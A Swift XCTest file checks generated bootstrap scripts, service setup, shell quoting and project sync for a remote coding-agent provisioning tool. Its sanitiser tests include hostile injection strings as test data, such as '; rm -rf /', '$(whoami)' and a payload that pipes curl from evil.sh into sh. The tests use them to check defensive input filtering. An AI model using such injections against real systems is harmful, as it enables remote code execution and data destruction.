import XCTest
@testable import CodexRemoteKit

/// The bootstrap scripts are generated text that only ever runs on a remote host, where a
/// syntax error costs a whole provision. These tests run `bash -n` over every stage so a
/// broken quote is caught here instead of three minutes into a real server.
final class BootstrapScriptTests: XCTestCase {
    private let plan = BootstrapPlan(
        workspacePath: "/root/workspace",
        remotePort: 1456,
        codexVersion: "0.157.0",
        extraPackages: ["golang-go", "postgresql-client"],
        postSetupScript: "git clone https://example.com/repo.git\necho done",
        idleShutdownMinutes: 60
    )

    private func assertValidShell(_ script: String, _ label: String,
                                  file: StaticString = #filePath, line: UInt = #line) throws {
        let url = FileManager.default.temporaryDirectory
            .appendingPathComponent("codex-remote-\(label)-\(UUID().uuidString).sh")
        defer { try? FileManager.default.removeItem(at: url) }
        try script.write(to: url, atomically: true, encoding: .utf8)

        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/bash")
        process.arguments = ["-n", url.path]
        let pipe = Pipe()
        process.standardError = pipe
        try process.run()
        process.waitUntilExit()
        let message = String(decoding: pipe.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)
        XCTAssertEqual(process.terminationStatus, 0,
                       "\(label) is not valid bash:\n\(message)", file: file, line: line)
    }

    func testEveryStageIsValidBash() throws {
        try assertValidShell(BootstrapScript.basePackages(plan), "base")
        try assertValidShell(BootstrapScript.installCodex(plan), "codex")
        try assertValidShell(BootstrapScript.installService(plan), "service")
        try assertValidShell(BootstrapScript.installNode(), "node")
        try assertValidShell(XCTUnwrap(BootstrapScript.deferredSetup(plan)), "deferred-setup")
        try assertValidShell(BootstrapScript.uninstall(), "uninstall")
    }

    func testServiceStageIsValidBashWithoutIdleShutdown() throws {
        var noIdle = plan
        noIdle = BootstrapPlan(workspacePath: plan.workspacePath, remotePort: plan.remotePort,
                               idleShutdownMinutes: 0)
        try assertValidShell(BootstrapScript.installService(noIdle), "service-no-idle")
        XCTAssertFalse(BootstrapScript.installService(noIdle).contains("codex-remote-idle.timer"))
    }

    func testHeredocTerminatorsAreAtColumnZero() {
        // `<<'EOF'` (not `<<-`) requires the terminator to start at column 0; Swift's
        // multiline-string indentation stripping is what makes that true, so pin it.
        for line in BootstrapScript.installService(plan).split(separator: "\n", omittingEmptySubsequences: false)
        where line.contains("CODEX_REMOTE_") && !line.contains("<<") {
            XCTAssertFalse(line.hasPrefix(" "), "heredoc terminator is indented: \(line)")
        }
    }

    func testServiceUnitPointsAtTheLoopbackListenerWithTokenAuth() {
        let script = BootstrapScript.installService(plan)
        XCTAssertTrue(script.contains("--listen ws://127.0.0.1:1456"))
        XCTAssertTrue(script.contains("--ws-auth capability-token"))
        XCTAssertTrue(script.contains("--ws-token-file /etc/codex-remote/appserver.token"))
        XCTAssertTrue(script.contains("Restart=always"))
    }

    func testCodexStageHonoursAPinnedVersion() {
        XCTAssertTrue(BootstrapScript.installCodex(plan).contains("CODEX_RELEASE='0.157.0'"))
        let unpinned = BootstrapPlan(workspacePath: "/root/workspace", remotePort: 1456)
        XCTAssertFalse(BootstrapScript.installCodex(unpinned).contains("CODEX_RELEASE"))
    }

    /// Codex is a prebuilt binary now. Going back through npm would put Node on the critical
    /// path again, which measured 87s on a stock Ubuntu image against 5-8s for the binary.
    func testCodexInstallsWithoutNode() {
        let script = BootstrapScript.installCodex(plan)
        XCTAssertFalse(script.contains("npm install"))
        XCTAssertFalse(script.contains("nodesource"))
        XCTAssertTrue(script.contains("chatgpt.com/codex/install.sh"))
        // /root is mode 700, so the package cannot live in the service user's home if the
        // agent runs as anyone else.
        XCTAssertTrue(script.contains("CODEX_HOME=/opt/codex"))
    }

    /// Extra packages come from a free-text field, so they must not be able to become
    /// a second command in the apt line.
    func testExtraPackagesAreFilteredToPackageNames() {
        let hostile = BootstrapPlan(workspacePath: "/root/workspace", remotePort: 1456,
                                    extraPackages: ["golang-go", "; rm -rf /", "$(whoami)", "a&&b"])
        let script = try! XCTUnwrap(BootstrapScript.deferredSetup(hostile))
        XCTAssertTrue(script.contains("golang-go"))
        XCTAssertFalse(script.contains("rm -rf /"))
        XCTAssertFalse(script.contains("$(whoami)"))
        XCTAssertFalse(script.contains("a&&b"))
    }

    /// Extra packages and the user's script must not hold up Ready: the agents are usable
    /// long before either finishes, and a setup script can run for many minutes.
    func testExtrasAndSetupScriptRunInTheBackground() throws {
        let script = try XCTUnwrap(BootstrapScript.deferredSetup(plan))
        XCTAssertTrue(script.contains("systemctl start --no-block"))
        XCTAssertTrue(script.contains(BootstrapScript.deferredSetupServiceName))
        // The base stage no longer carries them.
        XCTAssertFalse(BootstrapScript.basePackages(plan).contains("golang-go"))
    }

    func testNothingIsDeferredWhenThereIsNothingToDefer() {
        let bare = BootstrapPlan(workspacePath: "/root/workspace", remotePort: 1456)
        XCTAssertNil(BootstrapScript.deferredSetup(bare))
    }

    func testWorkspacePathReachesEveryStageThatNeedsIt() {
        let plan = BootstrapPlan(workspacePath: "/srv/agent", remotePort: 9999)
        XCTAssertTrue(BootstrapScript.basePackages(plan).contains("/srv/agent"))
        XCTAssertTrue(BootstrapScript.installService(plan).contains("WorkingDirectory=/srv/agent"))
    }

    func testCloudInitIsValidYAMLHeader() {
        XCTAssertTrue(BootstrapScript.cloudInit().hasPrefix("#cloud-config"))
    }
}

/// The name the user types has to be the name everything else shows: the machine's own
/// hostname, the Codex app's entry, and the Claude session.
final class MachineNamingTests: XCTestCase {
    func testTheHostnameIsSetFromTheMachineName() {
        let plan = BootstrapPlan(workspacePath: "/root/workspace", remotePort: 1456,
                                 hostname: "codex-eu")
        let script = BootstrapScript.basePackages(plan)
        XCTAssertTrue(script.contains("hostnamectl set-hostname 'codex-eu'"))
        XCTAssertTrue(script.contains("/etc/hosts"))
    }

    /// A machine name is free text and it lands in a shell command, so the sanitiser is
    /// what has to hold. Asserting against the whole script would be a weaker test and a
    /// misleading one — the script legitimately contains `rm -rf /etc/codex-remote` and `$(seq …)`.
    func testHostileNamesAreReducedToHarmlessHostnames() {
        let hostiles = [
            "a; rm -rf /",
            "$(whoami)",
            "`id`",
            "a b|c",
            "../../etc",
            "x' ; curl evil.sh | sh ; '",
        ]
        for hostile in hostiles {
            let safe = BootstrapScript.shellSafe(hostile)

            // Single-quoted, and containing nothing that could end the quoting or start a
            // command: no quotes, no $, no backticks, no pipes, no semicolons, no slashes.
            XCTAssertTrue(safe.hasPrefix("'") && safe.hasSuffix("'"), safe)
            let inner = safe.dropFirst().dropLast()
            XCTAssertTrue(inner.allSatisfy { $0.isLowercase || $0.isNumber || $0 == "-" },
                          "\(hostile) produced \(safe)")

            // And the dangerous fragment is genuinely gone from the emitted line.
            let script = BootstrapScript.basePackages(
                BootstrapPlan(workspacePath: "/root/workspace", remotePort: 1456, hostname: hostile))
            let hostnameLine = script.split(separator: "\n")
                .first { $0.contains("hostnamectl set-hostname") } ?? ""
            XCTAssertEqual(String(hostnameLine).trimmingCharacters(in: .whitespaces),
                           "hostnamectl set-hostname \(safe) 2>/dev/null || true")
        }
    }

    func testNamesAreReducedToSomethingAHostnameMayContain() {
        XCTAssertEqual(BootstrapScript.shellSafe("Codex EU"), "'codex-eu'")
        XCTAssertEqual(BootstrapScript.shellSafe("build/box_1"), "'build-box-1'")
        XCTAssertEqual(BootstrapScript.shellSafe("---"), "'codex-remote'")
        XCTAssertEqual(BootstrapScript.shellSafe(""), "'codex-remote'")
        // Hostnames are capped at 63 characters per label.
        XCTAssertLessThanOrEqual(BootstrapScript.shellSafe(String(repeating: "a", count: 200)).count, 65)
    }

    func testTheClaudeSessionIsNamedAfterTheMachineNotItsSSHAlias() {
        let plan = BootstrapPlan(workspacePath: "/root/workspace", remotePort: 1456,
                                 hostname: "codex-eu")
        let script = BootstrapScript.installClaudeService(plan, sessionName: "codex-eu")
        XCTAssertTrue(script.contains("remote-control --name codex-eu"))
        XCTAssertFalse(script.contains("--name codex-remote-codex-eu"),
                       "the user named it codex-eu, so that is what Claude should show")
    }
}

/// Providers gain new OS releases; a hardcoded default silently becomes the old one.
final class ImageSelectionTests: XCTestCase {
    func testTheNewestUbuntuWins() {
        let images = [
            OSImage(slug: "ubuntu-22.04", name: "Ubuntu 22.04", family: "ubuntu"),
            OSImage(slug: "ubuntu-26.04", name: "Ubuntu 26.04", family: "ubuntu"),
            OSImage(slug: "ubuntu-24.04", name: "Ubuntu 24.04", family: "ubuntu"),
            OSImage(slug: "debian-12", name: "Debian 12", family: "debian"),
        ]
        XCTAssertEqual(ProviderCapabilities.newestUbuntu(in: images)?.slug, "ubuntu-26.04")
    }

    /// Every cloud spells it differently.
    func testVersionIsParsedFromEachCloudsSlugShape() {
        XCTAssertEqual(ProviderCapabilities.ubuntuVersion(
            of: OSImage(slug: "ubuntu-26.04", name: "", family: "ubuntu")).0, 26)
        XCTAssertEqual(ProviderCapabilities.ubuntuVersion(
            of: OSImage(slug: "ubuntu-26-04-x64", name: "", family: "ubuntu")).0, 26)
        XCTAssertEqual(ProviderCapabilities.ubuntuVersion(
            of: OSImage(slug: "linode/ubuntu26.04", name: "", family: "ubuntu")).0, 26)
        XCTAssertEqual(ProviderCapabilities.ubuntuVersion(
            of: OSImage(slug: "", name: "Ubuntu 26.04 x64", family: "ubuntu")).0, 26)
    }

    func testNoUbuntuMeansNoGuess() {
        XCTAssertNil(ProviderCapabilities.newestUbuntu(
            in: [OSImage(slug: "debian-12", name: "Debian 12", family: "debian")]))
    }

    /// Every module's built-in list must offer Ubuntu 26 by default.
    func testEveryModuleDefaultsToUbuntu26() {
        for module in TofuRegistration.modules {
            let capabilities = module.fallbackCapabilities()
            guard let recommended = capabilities.images.first(where: {
                $0.slug == capabilities.recommendedImage
            }) else {
                // AWS resolves its AMI at apply time from an empty slug.
                XCTAssertEqual(capabilities.recommendedImage, "", module.displayName)
                continue
            }
            XCTAssertEqual(ProviderCapabilities.ubuntuVersion(of: recommended).0, 26,
                           "\(module.displayName) still defaults to an older Ubuntu")
        }
    }
}

/// An SSH session stays open until every process holding its stdout or stderr exits, so a
/// backgrounded job that inherits them hangs the client — a ten-minute `sleep` once held a
/// sign-in command open until it was killed. Everything Codex Remote backgrounds on a machine has
/// to close all three descriptors.
final class DetachedCommandTests: XCTestCase {
    func testDetachedCommandsCloseEveryDescriptor() {
        let detached = SSHClient.detached("sleep 900")
        XCTAssertTrue(detached.contains("</dev/null"), detached)
        XCTAssertTrue(detached.contains(">/dev/null"), detached)
        XCTAssertTrue(detached.contains("2>&1"), detached)
        XCTAssertTrue(detached.contains("setsid"), "it must leave the session's process group")
        XCTAssertTrue(detached.hasSuffix("&"))
    }

    /// The command becomes one single-quoted argument, so the real test is that a shell
    /// unquotes it back to exactly what went in.
    func testTheCommandSurvivesQuotingExactly() throws {
        let original = "echo 'already quoted' && rm -rf /tmp/x"
        let detached = SSHClient.detached(original)
        XCTAssertTrue(detached.contains("bash -c '"))
        // POSIX single-quote escaping: a quote is closed, escaped and reopened.
        XCTAssertTrue(detached.contains("'\\''"), detached)

        // Hand it to a real shell and check what bash -c would have received.
        let quoted = SSHClient.singleQuoted(original)
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/bash")
        process.arguments = ["-c", "printf '%s' \(quoted)"]
        let pipe = Pipe()
        process.standardOutput = pipe
        try process.run()
        process.waitUntilExit()
        let roundTripped = String(decoding: pipe.fileHandleForReading.readDataToEndOfFile(),
                                  as: UTF8.self)
        XCTAssertEqual(roundTripped, original, "quoting must be lossless and inert")
    }

    /// Every background job in a generated script has to be a detached one.
    func testNoBootstrapScriptBackgroundsAJobWithoutRedirecting() {
        let plan = BootstrapPlan(workspacePath: "/root/workspace", remotePort: 1456,
                                 idleShutdownMinutes: 30, hostname: "box")
        let scripts: [(String, String)] = [
            ("base", BootstrapScript.basePackages(plan)),
            ("codex", BootstrapScript.installCodex(plan)),
            ("claude", BootstrapScript.installClaudeCode(plan)),
            ("codex service", BootstrapScript.installService(plan)),
            ("claude service", BootstrapScript.installClaudeService(plan, sessionName: "box")),
            ("uninstall", BootstrapScript.uninstall()),
        ]
        for (name, script) in scripts {
            for line in script.split(separator: "\n") {
                let trimmed = line.trimmingCharacters(in: .whitespaces)
                guard trimmed.hasSuffix("&"), !trimmed.hasSuffix("&&") else { continue }
                XCTAssertTrue(trimmed.contains(">/dev/null") || trimmed.contains("setsid"),
                              "\(name) backgrounds a job without closing its descriptors: \(trimmed)")
            }
        }
    }
}

/// Claude Code runs under its own unprivileged account. Root refuses its most permissive
/// mode, and an agent with a whole machine to itself has no reason to be root.
final class ClaudeAccountTests: XCTestCase {
    private let plan = BootstrapPlan(workspacePath: "/srv/workspace", remotePort: 1456,
                                     hostname: "box")

    func testTheAccountIsCreatedAndOwnsItsOwnInstall() {
        let script = BootstrapScript.installClaudeCode(plan)
        XCTAssertTrue(script.contains("useradd --create-home --shell /bin/bash claude"))
        XCTAssertTrue(script.contains("su - claude -c 'curl -fsSL https://claude.ai/install.sh | bash'"),
                      "the install must run as the account that will use it")
        XCTAssertTrue(script.contains("passwd -l claude"), "no password login for the agent account")
    }

    func testTheServiceRunsAsTheAccountNotRoot() {
        let script = BootstrapScript.installClaudeService(plan, sessionName: "box")
        XCTAssertTrue(script.contains("User=claude"))
        XCTAssertTrue(script.contains("Group=claude"))
        XCTAssertTrue(script.contains("Environment=HOME=/home/claude"))
        XCTAssertFalse(script.contains("User=root"), "the whole point is that it is not root")
    }

    /// `/root` is mode 700, so an unprivileged account cannot traverse into it. A machine
    /// built before the account existed has exactly that workspace, and must not get a
    /// service that cannot reach its own working directory.
    func testAWorkspaceUnderRootIsReplacedForTheAgentAccount() {
        let legacy = BootstrapPlan(workspacePath: "/root/workspace", remotePort: 1456)
        XCTAssertEqual(legacy.claudeWorkspace, "/home/claude/workspace")

        let shared = BootstrapPlan(workspacePath: "/srv/workspace", remotePort: 1456)
        XCTAssertEqual(shared.claudeWorkspace, "/srv/workspace",
                       "a reachable workspace is shared, not duplicated")

        let script = BootstrapScript.installClaudeService(legacy, sessionName: "box")
        XCTAssertTrue(script.contains("WorkingDirectory=/home/claude/workspace"))
    }

    func testTheSharedWorkspaceIsWritableByBothAgents() {
        let script = BootstrapScript.installClaudeCode(plan)
        XCTAssertTrue(script.contains("chown -R claude:claude '/srv/workspace'"))
        // setgid keeps anything created inside group-writable, so root and claude can both
        // work in the same tree.
        XCTAssertTrue(script.contains("chmod 2775 '/srv/workspace'"))
    }

    func testTheDefaultWorkspaceIsNotUnderRoot() {
        XCTAssertFalse(MachineSpec.defaultWorkspacePath.hasPrefix("/root"),
                       "an unprivileged agent could never reach it there")
    }
}

extension ClaudeAccountTests {
    /// A machine authorised before the agent account existed keeps its login: moving it is
    /// the same credential on the same machine, and avoids a needless second browser
    /// approval. It moves rather than copies, so root's copy stops being usable.
    func testAnExistingRootLoginIsMovedToTheAccount() {
        let script = BootstrapScript.installClaudeCode(
            BootstrapPlan(workspacePath: "/srv/workspace", remotePort: 1456))
        XCTAssertTrue(script.contains("mv /root/.claude/.credentials.json /home/claude/.claude/.credentials.json"))
        XCTAssertTrue(script.contains("chmod 600 /home/claude/.claude/.credentials.json"))
        XCTAssertFalse(script.contains("cp /root/.claude/.credentials.json"),
                       "two copies of one credential is the problem, not the fix")
    }
}

extension ClaudeAccountTests {
    /// `install /dev/stdin` fails with ENOENT once the destination exists, so it broke
    /// every repair after the first. The drop-in is also validated before it goes into
    /// place: an unparseable sudoers file takes sudo down for root too.
    func testTheSudoersDropInIsWrittenSafelyAndValidatedBeforeItLands() {
        let script = BootstrapScript.installClaudeCode(
            BootstrapPlan(workspacePath: "/srv/workspace", remotePort: 1456))
        XCTAssertFalse(script.contains("install -m 0440 /dev/stdin"),
                       "install /dev/stdin is not idempotent — repairs fail on it")
        let staged = "/etc/sudoers.d/.90-codex-remote-claude.new"
        XCTAssertTrue(script.contains("cat > \(staged)"))
        guard let validate = script.range(of: "visudo -cf \(staged)"),
              let move = script.range(of: "mv \(staged) /etc/sudoers.d/90-codex-remote-claude")
        else { return XCTFail("expected the drop-in to be validated, then moved into place") }
        XCTAssertTrue(validate.lowerBound < move.lowerBound, "validate before it lands")
    }
}

extension ClaudeAccountTests {
    /// `claude --remote-control <name>` starts ONE session: it shows in Recents but leaves
    /// the Remote Control menu empty, so you cannot start a new project on the machine.
    /// `claude remote-control` is the host side that registers the machine itself.
    func testTheServiceRunsTheHostDaemonNotASingleSession() {
        let unit = BootstrapScript.installClaudeService(
            BootstrapPlan(workspacePath: "/srv/workspace", remotePort: 1456),
            sessionName: "demo-box")
        XCTAssertTrue(unit.contains("/usr/local/bin/claude remote-control --name demo-box"))
        XCTAssertFalse(unit.contains("claude --remote-control demo-box"),
                       "that form only ever registers one session, never the machine")
    }

    /// The host daemon asks "Enable Remote Control? (y/n)" on first run and blocks forever
    /// under systemd waiting for an answer nobody is there to give.
    func testTheEnableRemoteControlPromptIsPreAnswered() {
        let script = BootstrapScript.installClaudeCode(
            BootstrapPlan(workspacePath: "/srv/workspace", remotePort: 1456))
        XCTAssertTrue(script.contains("data[\"remoteDialogSeen\"] = True"))
    }
}

/// Putting an existing project on a machine. The failure modes here are quiet ones —
/// losing uncommitted work, or arriving without the files a clone cannot carry.
final class ProjectSyncTests: XCTestCase {
    private func project(remote: String? = "git@github.com:me/app.git",
                         dirty: Bool = false,
                         secrets: [String] = []) -> ProjectSync.Project {
        ProjectSync.Project(path: "/Users/me/app", name: "app", gitRemote: remote,
                            branch: "main", hasUncommittedChanges: dirty, secrets: secrets)
    }

    /// Cloning a repo with uncommitted work silently leaves that work behind, so it stops
    /// being an option the moment the tree is dirty.
    func testADirtyTreeIsCopiedRatherThanCloned() {
        XCTAssertEqual(project(dirty: false).recommended, .clone)
        XCTAssertEqual(project(dirty: true).recommended, .copy)
        XCTAssertFalse(project(dirty: true).canClone)
    }

    /// A local-only repo has nothing to clone from.
    func testAProjectWithNoRemoteIsCopied() {
        XCTAssertEqual(project(remote: nil).recommended, .copy)
    }

    /// Copying node_modules from macOS to Linux ships broken native modules, and the rest
    /// is rebuildable bulk.
    func testTheCopyLeavesOutWhatShouldBeRebuilt() {
        let arguments = ProjectSync.rsyncArguments(project: project(), destination: "h:/srv/w",
                                                   sshCommand: "ssh", includeGitDirectory: false)
        for pattern in ["node_modules", ".venv", "dist", ".DS_Store"] {
            XCTAssertTrue(arguments.contains(pattern), "should exclude \(pattern)")
        }
    }

    /// The machine may hold build output or a database. A flag that deletes anything not
    /// present on this Mac has no business running against someone's working directory.
    func testTheCopyNeverDeletesOnTheRemote() {
        let arguments = ProjectSync.rsyncArguments(project: project(), destination: "h:/srv/w",
                                                   sshCommand: "ssh", includeGitDirectory: true)
        XCTAssertFalse(arguments.contains("--delete"))
    }

    /// Without the trailing slash rsync nests the folder inside the destination, giving
    /// `/srv/workspace/app/app`.
    func testTheSourceEndsInASlashSoTheFolderIsNotNested() {
        let arguments = ProjectSync.rsyncArguments(project: project(), destination: "h:/srv/w",
                                                   sshCommand: "ssh", includeGitDirectory: true)
        XCTAssertTrue(arguments.contains("/Users/me/app/"))
    }

    /// Agent forwarding is what lets the machine authenticate as the user without a key
    /// ever being written to it.
    func testAgentForwardingIsOptInAndOffByDefault() {
        let machine = Machine(spec: MachineSpec(name: "m", accountID: UUID(), providerKind: .hetzner,
                                                region: "r", size: "s", image: "i",
                                                workspacePath: "/srv/workspace"),
                              localPort: 1, sshHostAlias: "a", privateKeyPath: "/tmp/k")
        XCTAssertFalse(ProjectSync.sshCommand(for: machine, forwardAgent: false).contains(" -A"))
        XCTAssertTrue(ProjectSync.sshCommand(for: machine, forwardAgent: true).contains(" -A"))
    }

    /// A token in the script would end up in the shell history and in any log of it.
    func testTheTokenIsReadFromTheEnvironmentNotBakedIntoTheScript() {
        let script = ProjectSync.cloneScript(project: project(), into: "/srv/workspace",
                                             auth: .githubToken)
        XCTAssertTrue(script.contains("$CODEX_REMOTE_GH_TOKEN"))
        XCTAssertTrue(script.contains("gh auth login --with-token"))
    }

    /// Re-running must update rather than fail on an existing directory.
    func testCloningTwiceUpdatesInsteadOfFailing() {
        let script = ProjectSync.cloneScript(project: project(), into: "/srv/workspace", auth: .none)
        XCTAssertTrue(script.contains("git fetch"))
        XCTAssertTrue(script.contains("git clone"))
    }
}

/// Finding the projects someone already works on, so sending one is a pick rather than a
/// path they have to remember.
final class ProjectDiscoveryTests: XCTestCase {
    /// Rsyncing a home directory or the filesystem root would be catastrophic, and both
    /// get opened by accident.
    func testTheHomeDirectoryAndRootAreNeverOffered() {
        let home = FileManager.default.homeDirectoryForCurrentUser.path
        XCTAssertFalse(ProjectDiscovery.isSendable(home))
        XCTAssertFalse(ProjectDiscovery.isSendable("/"))
    }

    /// A worktree already appears in the list under the repo's own path; sending one would
    /// copy a detached checkout.
    func testWorktreesAreSkipped() {
        XCTAssertFalse(ProjectDiscovery.isSendable("/Users/x/w/app/.claude/worktrees/thing"))
        XCTAssertFalse(ProjectDiscovery.isSendable("/Users/x/w/app/.git/worktrees/thing"))
    }

    /// Caches and temp directories are scratch, not projects.
    func testScratchDirectoriesAreSkipped() {
        for path in ["/Users/x/Library/Caches/thing", "/private/tmp/thing",
                     "/var/folders/ab/thing", "/Users/x/app/node_modules/pkg"] {
            XCTAssertFalse(ProjectDiscovery.isSendable(path), "should skip \(path)")
        }
    }

    /// A path recorded by an agent months ago may simply be gone, and a list that offers it
    /// wastes the user's time.
    func testAPathThatNoLongerExistsIsNotOffered() {
        XCTAssertFalse(ProjectDiscovery.isSendable("/definitely/not/here/\(UUID().uuidString)"))
    }

    /// Claude Code names a project's directory after its path with separators replaced;
    /// getting this wrong costs the recency ordering, silently.
    func testTheClaudeSessionDirectoryNameIsDerivedCorrectly() {
        XCTAssertEqual(ProjectDiscovery.slug(for: "/Users/pz/w/vex"), "-Users-pz-w-vex")
        XCTAssertEqual(ProjectDiscovery.slug(for: "/Users/pz/my.app"), "-Users-pz-my-app")
    }

    /// Reading someone's real machine: both files may be missing, and neither is required.
    func testDiscoveryNeverThrowsOnAMachineWithNeitherAgent() {
        XCTAssertNoThrow(ProjectDiscovery.discover())
    }
}

/// The bootstrap runs under `set -euo pipefail`. That combination turns a `grep` that
/// matches nothing into a silent, fatal error: grep exits 1, pipefail propagates it out of
/// the command substitution, and `set -e` ends the script without printing anything —
/// because grep prints nothing when it finds nothing.
///
/// It cost an afternoon. A machine that was connected and serving sessions was reported as
/// "Claude Remote Control service failed" with empty stderr, and it reproduced only when
/// the daemon had not yet written a session line, so any tracing slow enough to let one
/// appear made it pass.
final class BootstrapPipefailTests: XCTestCase {
    private var claudeService: String {
        BootstrapScript.installClaudeService(
            BootstrapPlan(remotePort: 14561, hostname: "test"), sessionName: "test")
    }

    func testOptionalGrepsCannotKillTheScript() {
        for line in claudeService.split(separator: "\n") {
            let text = String(line)
            guard text.contains("grep"), text.contains("$(") else { continue }
            XCTAssertTrue(text.contains("|| true"),
                          "a grep in a command substitution under `set -euo pipefail` ends the "
                          + "script when it matches nothing: \(text.trimmingCharacters(in: .whitespaces))")
        }
    }

    func testTheScriptStillSetsPipefail() {
        // If this is ever dropped the test above stops meaning anything.
        XCTAssertTrue(claudeService.contains("set -euo pipefail"))
    }

    func testTheSessionAndEnvironmentAreStillOptional() {
        // They are extras: the machine is connected before either is read, so neither
        // missing one should fail provisioning.
        XCTAssertTrue(claudeService.contains(#"[ -n "$url" ] && echo "CLAUDE_SESSION_URL=$url""#))
        XCTAssertTrue(claudeService.contains(#"[ -n "$env_id" ] && echo "CLAUDE_ENVIRONMENT_ID=$env_id""#))
    }
}
